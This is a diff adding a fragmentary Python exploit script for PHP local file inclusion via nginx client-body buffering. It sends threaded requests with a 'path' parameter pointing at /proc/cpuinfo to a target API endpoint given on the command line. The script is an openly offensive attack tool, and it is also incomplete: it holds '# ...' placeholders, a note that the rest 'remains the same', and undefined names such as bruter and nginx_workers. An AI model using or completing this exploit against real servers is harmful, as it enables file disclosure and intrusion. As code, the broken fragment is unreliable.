@@ -1,1 +1,32 @@
+#!/usr/bin/env python3
+import sys
+import threading
+import requests
+
+# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
+# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details
+
+# Update the URL to include the target endpoint and bearer token in the headers
+URL = f'http://{sys.argv[1]}:{sys.argv[2]}/api/v1/configuration'
+HEADERS = {
+    'Authorization': 'Bearer YOUR_TOKEN_HERE',  # Replace with your actual bearer token
+}
+
+# Rest of the script remains the same
+
+# ...
+
+# In your requests, use the 'params' parameter to set the 'path' parameter to '/proc/cpuinfo'
+
+# Example:
+def uploader():
+    print('[+] starting uploader')
+    while not done:
+        requests.get(URL, headers=HEADERS, params={'path': '/proc/cpuinfo', 'lfi': '1'})
+
+# ...
+
+for pid in nginx_workers:
+    a = threading.Thread(target=bruter, args=(pid, ))
+    a.start()
 
